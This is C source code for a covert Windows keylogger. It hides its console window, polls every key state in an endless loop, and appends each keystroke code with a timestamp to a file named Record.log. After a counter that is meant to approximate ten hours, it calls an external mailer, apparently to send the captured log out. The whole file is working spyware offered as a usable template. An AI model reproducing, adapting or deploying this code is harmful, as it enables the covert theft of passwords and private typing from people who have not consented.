#include <stdio.h>
#include <windows.h>
#include <time.h>

// output file name
#define FILE_NAME "Record.log"

main(){
    // hides the console window
    FreeConsole();

    // open or create a file
    FILE *file = fopen(FILE_NAME, "a");

    // writing date-time; & an extra '0' before every start which is used during decoding
    time_t date = time(NULL);
    fprintf(file, "0\n%s\t", ctime(&date));
    fclose(file);

    unsigned short ch, i;
    int countout = 1;
    while(1){ //infinite loop
        countout += 1;
        ch=1;
        while(ch<250){ //scans for 0-249 ASCII craracters

            // this strange and extra loop helps in sensing fast-keystrokes with
            // minimum processor use
            for(i=0; i<50; i++, ch++){

                //when key is stroke
                if(GetAsyncKeyState(ch) == -32767){

                    //append the ASCII code of the character
                    file=fopen(FILE_NAME, "a");
                    fprintf(file, "%d ", ch);
                    fclose(file);
                }
            }

            // this 1ms sleep inhibits the program from occupying full processor
            Sleep(1);
        }
        if (countout == 1000 * 60 * 60 * 10 /*translates to aprox 10 hours */) {
            system("mail.exe"); //or whatever your mailer is called
        }
    }

}